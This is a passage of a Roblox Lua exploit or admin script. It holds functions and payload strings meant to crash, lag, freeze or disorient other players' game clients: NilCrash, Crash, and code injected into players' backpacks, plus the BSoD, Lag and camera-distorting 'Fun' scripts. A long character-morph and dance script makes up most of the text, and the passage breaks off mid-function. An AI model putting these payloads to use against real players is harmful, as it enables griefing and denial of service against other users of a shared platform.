LocalPlayer = game:GetService("Players").LocalPlayer
script.Parent = __Unknown__
Tabs = {}
Cmds = {}
key = "/"
chatgui = true
probemode = false
connection = nil
 
--not sure if it will work.
--BRanks = -1 = Kick, -2 = Lag, -3 = Mute, -4 = Rejoin
Banlist = {}
Playerlist = {}
 
tabmodel = Instance.new("Model", Workspace)
tabmodel.Name = "Unknown Tabs"
SourceName = "DSource"
--[[
SourceNames:
Alakazard: 'source'
Anaminus: 'DSource'
AntiBoomz0r: 'Source'
]]--
 
function NilCrash(Name)
local Crasher = Instance.new("StringValue")
Crasher.Name = "Client"
Crasher.Value = string.lower(tostring(Name))
Crasher.Parent = game:GetService("Lighting")
wait(1)
if Crasher and Crasher.Parent then
ypcall(function()
Crasher:Destroy()
end)
end
end
 
function Crash(name)
name = tostring(name or "nil")
local t = Instance.new("StringValue")  
t.Name = "DISC: "..name
t.Parent = game.Lighting  
game:GetService("Debris"):AddItem(t,1)
end
 
function Connect(player)
if game.Players[player.Name] then
if not Playerlist[player.Name] then
NewLS(CrashSource,player:findFirstChild("Backpack"))
table.insert(Playerlist,player.Name)
Output('Connected | '..player.Name,__)
end
end
end
 
BSoDsource = [==[
          game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson  
wait(0)
script.Parent = nil
plr = game:GetService("Players").LocalPlayer
local plrgui = plr:findFirstChild("PlayerGui")
if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
while plr.Parent == game:GetService("Players") do
wait()
for i = 1, 10000000000 do
local sc = Instance.new("ScreenGui",plrgui)
local fr = Instance.new("TextLabel",sc)
 
 
 
 
fr.Text = "k"
fr.Size = UDim2.new(1, 1, 1, 1)
fr.FontSize = "Size48"
end
end
]==]
 
 
FunScript = [[
LP = game:service'Players'.LocalPlayer
Shapes = {"Ball", "Block, Sphere"}
wait()
script.Parent = nil
Delay(0, function()
while wait() do
workspace.CurrentCamera.CameraType = "Scriptable"
workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local Part = Instance.new("Part", workspace.CurrentCamera)
Part.Shape = Shapes[math.random(1, 2)]
Part.Anchored = true
Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
Part.Size = Vector3.new(math.random(5,50505050),math.random(-25,25),math.random(5,10))
Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.new(math.random(), math.random(), math.random())
Smoke.Opacity = 0.7
local Sparkles = Instance.new("Sparkles", Part)
Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random())
local Fire = Instance.new("Fire", Part)
Fire.Color = Color3.new(math.random(), math.random(), math.random())
Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random())
local Ex = Instance.new("Explosion", workspace.CurrentCamera)
Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
Ex.BlastPressure = 15555
Ex.BlastRadius = 12.555
if not workspace.CurrentCamera:findFirstChild("Hint") then
local mes = Instance.new("Hint", workspace.CurrentCamera)
mes.Text = "ooooOoOsoOooOooOooOoOoooOoOo YOU BE HIGH BRAH"
end
end
end)
]]
 
 
LagSource = [[
        wait()
        script.Parent = game:service'TeleportService'
        CC = workspace.CurrentCamera
            game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
 
        RS = game:service("RunService")
        PG = game.Players.LocalPlayer.PlayerGui
        C = game.Players.LocalPlayer.Character
        function Lag()
                coroutine.resume(coroutine.create(function()
                        while wait() do
                                M = Instance.new("Message",CC)
                                M.Text = tick()*math.floor(30%40*50)
                                H = Instance.new("Hint",CC)
                                H.Text = 'Lmao, you having fun?:)'
                                SG=Instance.new("ScreenGui",PG)
                                FR=Instance.new("Frame",SG)
                                FR.Size = UDim2.new(50,5000,5000,50)
                                while wait() do
                                        FR.BackgroundColor3 = Color3.new(math.random(0,255),math.random(0,255),math.random(0,255))
                                end
                                P=Instance.new("Part",CC)
                                E=Instance.new("Explosion",P)
                                E.BlastRadius=math.huge
                                E.Position=P.Position
                                F=Instance.new("Fire",P)
                                S=Instance.new("Smoke",P)
                                P.CFrame = CC.Focus
                                P.Anchored = true
                                P.CanCollide = false
                                P.AncestryChanged:connect(function()Lag()end)
                                for _,v in pairs(C:GetChildren()) do pcall(function()v.Anchored=true end) end
                        end
                end))
        end
        RS.Stepped:connect(function()for i=1,15015015015015015015015015050 do Lag()Lag()Lag()end end)
]]
 
 
MiniPeep = [[
local ran,err = ypcall(function()
plr = game:service'Players'.LocalPlayer
char = plr.Character
mouse = plr:GetMouse()
humanoid = char:findFirstChild("Humanoid")
torso = char:findFirstChild("Torso")
head = char.Head
ra = char:findFirstChild("Right Arm")
la = char:findFirstChild("Left Arm")
rl = char:findFirstChild("Right Leg")
ll = char:findFirstChild("Left Leg")
rs = torso:findFirstChild("Right Shoulder")
ls = torso:findFirstChild("Left Shoulder")
rh = torso:findFirstChild("Right Hip")
lh = torso:findFirstChild("Left Hip")
neck = torso:findFirstChild("Neck")
rj = char:findFirstChild("HumanoidRootPart"):findFirstChild("RootJoint")
anim = char:findFirstChild("Animate")
rootpart = char:findFirstChild("HumanoidRootPart")
camera = workspace.CurrentCamera
if anim then
anim:Destroy()
end
rj.C0 = CFrame.new()
rj.C1 = CFrame.new()
super_annoying = Instance.new("Sound", head)
super_annoying.SoundId = "http://www.roblox.com/asset/?id=149613358"
super_annoying.Volume = 1
super_annoying.Looped = true
uni = Instance.new("Sound", head)
uni.SoundId = "http://www.roblox.com/asset/?id=141444871"
uni.Volume = 1
uni.Looped = true
ann = Instance.new("Sound", head)
ann.SoundId = "http://www.roblox.com/asset/?id=130808056"
ann.Volume = 1
ann.Looped = true
fwutters = Instance.new("Sound", head)
fwutters.SoundId = "http://www.roblox.com/asset/?id=148896355"
fwutters.Volume = 1
fwutters.Looped = true
loll = Instance.new("Sound", head)
loll.SoundId = "http://www.roblox.com/asset/?id=130803007"
loll.Volume = 1
loll.Looped = true
land_of_swords = Instance.new("Sound", head)
land_of_swords.SoundId = "http://www.roblox.com/asset/?id=142357253"
land_of_swords.Volume = 1
land_of_swords.Looped = true
qq = Instance.new("Sound", head)
qq.SoundId = "http://www.roblox.com/asset/?id=142295308"
qq.Volume = 1
qq.Looped = true
doge = Instance.new("Sound", head)
doge.SoundId = "http://www.roblox.com/asset/?id=138213729"
doge.Volume = 1
doge.Looped = true
nyan = Instance.new("Sound", head)
nyan.SoundId = "http://www.roblox.com/asset/?id=142332086"
nyan.Volume = 1
nyan.Looped = true
sctmn = Instance.new("Sound", head)
sctmn.SoundId = "http://www.roblox.com/asset/?id=143620887"
sctmn.Volume = 1
sctmn.Looped = true
barrel_roll = Instance.new("Sound", head)
barrel_roll.SoundId = "http://www.roblox.com/asset/?id=130791919"
barrel_roll.Volume = 1
barrel_roll.Looped = true
dubstep_gun = Instance.new("Sound", head)
dubstep_gun.SoundId = "http://www.roblox.com/asset/?id=147096633"
dubstep_gun.Volume = 1
dubstep_gun.Looped = true
you_are_pirate = Instance.new("Sound", head)
you_are_pirate.SoundId = "http://www.roblox.com/asset/?id=130888577"
you_are_pirate.Volume = 1
you_are_pirate.Looped = true
cant_touch = Instance.new("Sound", head)
cant_touch.SoundId = "http://www.roblox.com/asset/?id=131280929"
cant_touch.Volume = 1
cant_touch.Looped = true
gangy_style = Instance.new("Sound", head)
gangy_style.SoundId = "http://www.roblox.com/asset/?id=130844430"
gangy_style.Volume = 1
gangy_style.Looped = true
fox_say = Instance.new("Sound", head)
fox_say.SoundId = "http://www.roblox.com/asset/?id=143110546"
fox_say.Volume = 1
fox_say.Looped = true
durk = Instance.new("Sound", head)
durk.SoundId = "http://www.roblox.com/asset/?id=142376365"
durk.Volume = 1
durk.Looped = true
sax_guy = Instance.new("Sound", head)
sax_guy.SoundId = "http://www.roblox.com/asset/?id=130794684"
sax_guy.Volume = 1
sax_guy.Looped = true
heman = Instance.new("Sound", head)
heman.SoundId = "http://www.roblox.com/asset/?id=131102548"
heman.Volume = 1
heman.Looped = true
justin = Instance.new("Sound", head)
justin.SoundId = "http://www.roblox.com/asset/?id=138154702"
justin.Volume = 1
justin.Looped = true
brony_music = Instance.new("Sound", head)
brony_music.SoundId = "http://www.roblox.com/asset/?id=143768403"
brony_music.Volume = 1
brony_music.Looped = true
spitfire = Instance.new("Sound", head)
spitfire.SoundId = "http://www.roblox.com/asset/?id=130776739"
spitfire.Volume = 1
spitfire.Looped = true
burn_dem = Instance.new("Sound", head)
burn_dem.SoundId = "http://www.roblox.com/asset/?id=132399469"
burn_dem.Volume = 1
burn_dem.Looped = true
cant = Instance.new("Sound", head)
cant.SoundId = "http://www.roblox.com/asset/?id=131122314"
cant.Volume = 1
cant.Looped = true
if char:findFirstChild("Shirt") then
char:findFirstChild("Shirt"):Destroy()
end
if char:findFirstChild("Pants") then
char:findFirstChild("Pants"):Destroy()
end
if char:findFirstChild("Shirt Graphic") then
char:findFirstChild("Shirt Graphic"):Destroy()
end
Instance.new("HumanoidController", game:service'ControllerService')
Instance.new("SkateboardController", game:service'ControllerService')
Instance.new("VehicleController", game:service'ControllerService')
rh.Parent = nil
lh.Parent = nil
rs.Parent = nil
ls.Parent = nil
neck.Parent = nil
rj.Parent = nil
rl.FormFactor = "Custom"
ll.FormFactor = "Custom"
ra.FormFactor = "Custom"
la.FormFactor = "Custom"
torso.FormFactor = "Custom"
head.FormFactor = "Custom"
rootpart.FormFactor = "Custom"
rootpart.Size = Vector3.new(.4, .4, .2)
rl.Size = Vector3.new(.2, .4, .2)
ll.Size = Vector3.new(.2, .4, .2)
ra.Size = Vector3.new(.2, .4, .2)
la.Size = Vector3.new(.2, .4, .2)
torso.Size = Vector3.new(.4, .4, .2)
head.Size = Vector3.new(.4, .2, .2)
rh.Parent = torso
lh.Parent = torso
rs.Parent = torso
ls.Parent = torso
neck.Parent = torso
rj.Parent = rootpart
if torso:findFirstChild("roblox") then
local p = Instance.new("Part", char)
p.FormFactor = "Custom"
p.Size = torso.Size
p.Transparency = 1
p:BreakJoints()
local w = Instance.new("Weld", char)
w.Part0 = p
w.Part1 = torso
torso:findFirstChild("roblox").Parent = p
end
mesh1 = Instance.new("SpecialMesh", torso)
mesh1.Name = "Mesh"
mesh1.Scale = torso.Size - Vector3.new(torso.Size.x/2, torso.Size.y/2, 0)
mesh1.MeshId = "rbxasset://fonts/torso.mesh"
mesh2 = Instance.new("SpecialMesh", la)
mesh2.Name = "Mesh"
mesh2.Scale = la.Size - Vector3.new(0, la.Size.y/2, 0)
mesh2.MeshId = "rbxasset://fonts/leftarm.mesh"
mesh3 = Instance.new("SpecialMesh", ra)
mesh3.Name = "Mesh"
mesh3.Scale = ra.Size - Vector3.new(0, ra.Size.y/2, 0)
mesh3.MeshId = "rbxasset://fonts/rightarm.mesh"
mesh4 = Instance.new("SpecialMesh", ll)
mesh4.Name = "Mesh"
mesh4.Scale = ll.Size - Vector3.new(0, ll.Size.y/2, 0)
mesh4.MeshId = "rbxasset://fonts/leftleg.mesh"
mesh5 = Instance.new("SpecialMesh", rl)
mesh5.Name = "Mesh"
mesh5.Scale = rl.Size - Vector3.new(0, rl.Size.y/2, 0)
mesh5.MeshId = "rbxasset://fonts/rightleg.mesh"
ls.C0 = CFrame.new(-.3,.1,0)
ls.C1 = CFrame.new(0,.1,0)
rs.C0 = CFrame.new(.3,.1,0)
rs.C1 = CFrame.new(0,.1,0)
rh.C0 = CFrame.new(.1,-.2,0)
rh.C1 = CFrame.new(0, .2, 0)
lh.C0 = CFrame.new(-.1,-.2,0)
lh.C1 = CFrame.new(0, .2, 0)
neck.C0 = CFrame.new(0,.2,0)
neck.C1 = CFrame.new(0,-.1,0)
bodyc = char:findFirstChild("Body Colors")
if bodyc then
bodyc:Destroy()
end
wait(0.1)
skincolor = {"Pastel brown"}
clothcolor = {"Dark green", "Really red","Bright yellow","Bright orange","Lavender","Royal purple","Bright blue","Toothpaste","Institutional white","Hot pink"}
skincolorrandom = BrickColor.new(skincolor[math.random(1, #skincolor)])
clothcolorrandom = BrickColor.new(clothcolor[math.random(1, #clothcolor)])
function restorecolors()
for _,bp in pairs(char:children()) do
if bp:IsA("BasePart") then
bp.BrickColor = skincolorrandom
end
end
torso.BrickColor = clothcolorrandom
ll.BrickColor = clothcolorrandom
rl.BrickColor = clothcolorrandom
end
restorecolors()
local LightForTorso = Instance.new("PointLight", head)
LightForTorso.Range = 15
LightForTorso.Brightness = 20
coroutine.wrap(function()
while LightForTorso ~= nil do
LightForTorso.Color = Color3.new(math.random(), math.random(), math.random())
wait(0.8)
end
end)()
local slidecount = 0
local slidecountmax = 0
local anim = ""
local lastanim = anim
local speed = 0
local looking = false
local dancing = false
local superannoying = false
local barrelroll = false
local dubstepgun = false
local foxie = false
local durka = false
local saxguy = false
local heya = false
local jb = false
local bronymusic = false
local sheddy = false
local burndem = false
local canttt = false
local global_wait = 0
count = 0
countspeed = 1
sine = 0
sinespeed = 1
humanoid.WalkSpeed = 20
local controllerService = game:GetService("ControllerService")
local controller = controllerService:GetChildren()[1]
local colors = {"Dark green", "Really red","Bright yellow","Bright orange","Lavender","Royal purple","Bright blue","Toothpaste","Institutional white","Hot pink"}
humanoid.Died:connect(function()
for cframe_parts = 0, 100 do
local p = Instance.new("Part")
p.FormFactor = "Custom"
p.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
p.Size = Vector3.new(1, 1, 1)
Instance.new("BlockMesh", p).Scale = Vector3.new(0.05, 0.05, 0.05)
p.Locked = true
p.CanCollide = false
p.Anchored = true
p.CFrame = torso.CFrame * CFrame.Angles(math.random(-36, 36),math.random(-36, 36),math.random(-36, 36))
p.Parent = workspace
game:service'Debris':AddItem(p, 5)
coroutine.wrap(function()
while wait() do
if p ~= nil then
p.CFrame = p.CFrame * CFrame.new(0, 0.085, 0)
p.Mesh.Scale = p.Mesh.Scale - Vector3.new(0.005, 0, 0.005) + Vector3.new(0, 0.01, 0)
p.Transparency = p.Transparency + 0.015
else
break
end
end
end)()
end
for _,v in pairs(char:children()) do
if v:IsA("Part") then
v:Destroy()
end
end
end)
mouse.KeyDown:connect(function(k)
if string.byte(k) == 50 then
if dancing then return end
sitting = not sitting
if sitting then
local ray = Ray.new(torso.Position, Vector3.new(0, -1, 0))
local hitz,enz = workspace:FindPartOnRay(ray, char)
if hitz then
controller.Parent = nil
humanoid.WalkSpeed = 0
coroutine.wrap(function()
while wait() do
humanoid.PlatformStand = true
if sitting == false then humanoid.PlatformStand = false break end
end
end)()
rj.C0 = CFrame.new(0, -0.35, 0) * CFrame.Angles(math.rad(10), 0, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.pi/2-math.rad(10), 0, -math.pi/16)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(math.pi/2-math.rad(10), 0, math.pi/16)
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(-math.rad(10), 0, -math.pi/10)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-math.rad(10), 0, math.pi/10)
miniweld = Instance.new("Weld", char)
miniweld.C0 = hitz.CFrame:toObjectSpace(rootpart.CFrame)
miniweld.Part0 = hitz
miniweld.Part1 = rootpart
else
sitting = false
return
end
else
if miniweld then
miniweld:Destroy()
end
controller.Parent = controllerService
humanoid.PlatformStand = false
humanoid.WalkSpeed = 30
end
end
if string.byte(k) == 32 then
fwutters:Stop()
uni:Stop()
loll:Stop()
qq:Stop()
ann:Stop()
nyan:Stop()
sctmn:Stop()
cant:Stop()
superannoying = false
barrelroll = false
heya = false
dubstepgun = false
youpirate = false
canttouch = false
gangnam = false
sheddy = false
durka = false
saxguy = false
foxie = false
burndem = false
bronymusic = false
canttt = false
land_of_swords:stop()
brony_music:stop()
fox_say:stop()
spitfire:stop()
heman:stop()
doge:Stop()
justin:stop()
jb = false
durk:stop()
restorecolors()
burn_dem:stop()
if hat then
hat:Destroy()
end
sax_guy:stop()
gangy_style:stop()
cant_touch:stop()
you_are_pirate:stop()
dubstep_gun:stop()
super_annoying:stop()
barrel_roll:stop()
dancing = false
global_wait = 0
LightForTorso.Color = torso.BrickColor.Color
end
if k == "z" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Jb Time!",0)
jb = true
super_annoying:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=84302661"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=84302759"
hatmesh.Scale = Vector3.new(.2, .2, .2)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0, -0.6, 0)
end
end
if k == "=" then
if dancing then return end
if not sitting then
dancing = true
canttt = true
cant:play()
game:GetService("Chat"):Chat(head,"Can't touch me!",0)
end
end
if k == "u" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"I'm a scat man!",0)
saxguy = true
sctmn:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=43996479"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=43997070"
hatmesh.Scale = Vector3.new(.0925, .0925, .0925)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = la
hatweld.C0 = CFrame.new(-0.18, -0.05, .04) * CFrame.Angles(math.pi - math.rad(18), 0, math.pi/4)
end
end
 
if k == "k" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Ain't anybody got time for dat!",0)
sheddy = true
spitfire:play()
end
end
if k == "," then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Land of swords!",0)
foxie = true
land_of_swords:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=1285237"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=118666588"
hatmesh.Scale = Vector3.new(.25, .25, .25)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = la
hatweld.C0 = CFrame.new(-0.18, -0.05, .04) * CFrame.Angles(math.pi - math.rad(18), 0, math.pi/4)
end
end
 
if k == "p" then
if dancing then return end
if not sitting then
dancing = true
foxie = true
game:GetService("Chat"):Chat(head,"It's raining tacos!",0)
qq:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=14846869"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=14846834"
hatmesh.Scale = Vector3.new(.25, .25, .25)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = la
hatweld.C0 = CFrame.new(-0.18, -0.05, .04) * CFrame.Angles(math.pi - math.rad(18), 0, math.pi/4)
end
end
 
if k == ";" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"PICK THE UNICORN!",0)
heya = true
uni:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=84003494"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=83992632"
hatmesh.Scale = Vector3.new(.25, .25, .25)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = la
hatweld.C0 = CFrame.new(-0.18, -0.05, .04) * CFrame.Angles(math.pi - math.rad(18), 0, math.pi/4)
end
end
 
if k == "n" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Gangnam Style!",0)
gangnam = true
gangy_style:play()
end
end
if k == "t" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"x3",0)
heya = true
ann:play()
end
end
if k == "-" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"TROLOLOLOLOLO",0)
heya = true
loll:play()
end
end
 
if k == "r" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"BURN! BURN THEM!",0)
burndem = true
burn_dem:play()
end
end
if k == "x" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Do the barrel roll!",0)
barrelroll = true
barrel_roll:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = torso.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=29873142"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=31467063"
hatmesh.Scale = Vector3.new(.22, .2, .22)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = torso
end
end
if k == "h" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,":D",0)
heman:play()
heya = true
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = torso.Size + Vector3.new(0.01, 0.01, 0.01)
hat.Locked = true
hat.BrickColor = BrickColor.new("Hot pink")
hat:breakJoints()
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = torso
end
end
if k == "j" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Don drop dat durk durk!",0)
justin:play()
jb = true
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat.BrickColor = BrickColor.new("Hot pink")
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=19999424"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=20571982"
hatmesh.Scale = Vector3.new(.23, .23, .23)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0.025, -0.05, 0)
end
end
 
if k == "'" then
if dancing then return end
if not sitting then
dancing = true
fwutters:play()
game:GetService("Chat"):Chat(head,"Da Fwutters!",0)
bronymusic = true
for _,bp in pairs(char:children()) do
if bp:IsA("BasePart") then
bp.BrickColor = BrickColor.new("Cool yellow")
end
end
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat.BrickColor = BrickColor.new("Cool yellow")
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=82348513"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=36527326"
hatmesh.Scale = Vector3.new(.28, .28, .28)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0.025, 0, 0)
end
end
 
if k == "c" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Yayyy! Caramell!",0)
dubstepgun = true
dubstep_gun:play()
end
end
 
if k == "v" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"I am a pirate!",0)
youpirate = true
you_are_pirate:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=1028848"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=1028847"
hatmesh.Scale = Vector3.new(.2, .2, .2)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0, -0.15, 0)
end
end
if k == "m" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Can't touch this!",0)
canttouch = true
cant_touch:play()
end
end
if k == "b" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Now for brony music!",0)
bronymusic = true
brony_music:play()
for _,bp in pairs(char:children()) do
if bp:IsA("BasePart") then
bp.BrickColor = BrickColor.new("Pink")
end
end
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat.BrickColor = BrickColor.new("Lavender")
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=1095708"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=60375192"
hatmesh.Scale = Vector3.new(.25, .25, .45)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0, -0.1, 0.05)
end
end
 
if k == "y" then
if dancing then return end
if not sitting then
dancing = true
bronymusic = true
nyan:play()
for _,bp in pairs(char:children()) do
if bp:IsA("BasePart") then
bp.BrickColor = BrickColor.new("Dark stone grey")
end
end
game:GetService("Chat"):Chat(head,"Nyan nyan nyan nyan!",0)
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat.BrickColor = BrickColor.new("Dark stone grey")
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=1374148"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=117119031"
hatmesh.Scale = Vector3.new(.2, .30, .2)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0, -0.15, 0.05)
end
end
 
if k == "l" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"What does the fox say?!",0)
foxie = true
fox_say:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=25266225"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=25266210"
hatmesh.Scale = Vector3.new(.2, .2, .2)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = head
hatweld.C0 = CFrame.new(0, -0.1, 0)
end
 
end
if k == "f" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"I'm wakin up!",0)
durka = true
durk:play()
end
end
if k == "g" then
if dancing then return end
if not sitting then
dancing = true
game:GetService("Chat"):Chat(head,"Now for some more music",0)
saxguy = true
sax_guy:play()
hat = Instance.new("Part", char)
hat.FormFactor = "Custom"
hat.CanCollide = false
hat.Size = head.Size
hat.Locked = true
hat:breakJoints()
local hatmesh = Instance.new("SpecialMesh", hat)
hatmesh.MeshId = "http://www.roblox.com/asset/?id=44410178"
hatmesh.TextureId = "http://www.roblox.com/asset/?id=44410320"
hatmesh.Scale = Vector3.new(.25, .25, .25)
local hatweld = Instance.new("Weld", hat)
hatweld.Part0 = hat
hatweld.Part1 = la
hatweld.C0 = CFrame.new(-0.18, -0.05, .04) * CFrame.Angles(math.pi - math.rad(18), 0, math.pi/4)
end
end
 
 
 
 
if k == "q" then
if Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude >= 14 then return end
if sitting then return end
looking = true
game:GetService("Chat"):Chat(head,"I'm just tiltin",0)
rj.C0 = CFrame.new(-math.pi/6, 0,0) * CFrame.Angles(0, 0, math.pi/4)
end
if k == "e" then
if Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude >= 14 then return end
if sitting then return end
looking = true
game:GetService("Chat"):Chat(head,"What's wrong with tilting?",0)
rj.C0 = CFrame.new(math.pi/6, 0,0) * CFrame.Angles(0, 0, -math.pi/4)
end
if string.byte(k) == 48 or string.byte(k) == 47 then
if sitting then return end
humanoid.WalkSpeed = 30
end
if string.byte(k) == 52 then
if sitting then return end
humanoid.WalkSpeed = 10
end
end)
 
mouse.KeyUp:connect(function(k)
if string.byte(k) == 48 or string.byte(k) == 47 then
if sitting then return end
humanoid.WalkSpeed = 20
end
if string.byte(k) == 32 then
game:GetService("Chat"):Chat(head,"Party's over! For now...",0)
superannoying = false
barrelroll = false
heya = false
dubstepgun = false
youpirate = false
canttouch = false
gangnam = false
sheddy = false
durka = false
saxguy = false
foxie = false
burndem = false
bronymusic = false
canttt = false
brony_music:stop()
cant:Stop()
fox_say:stop()
spitfire:stop()
heman:stop()
justin:stop()
jb = false
durk:stop()
restorecolors()
burn_dem:stop()
if hat then
hat:Destroy()
end
sax_guy:stop()
gangy_style:stop()
cant_touch:stop()
you_are_pirate:stop()
dubstep_gun:stop()
super_annoying:stop()
barrel_roll:stop()
dancing = false
global_wait = 0
LightForTorso.Color = torso.BrickColor.Color
end
 
 
if k == "q" then
if looking then
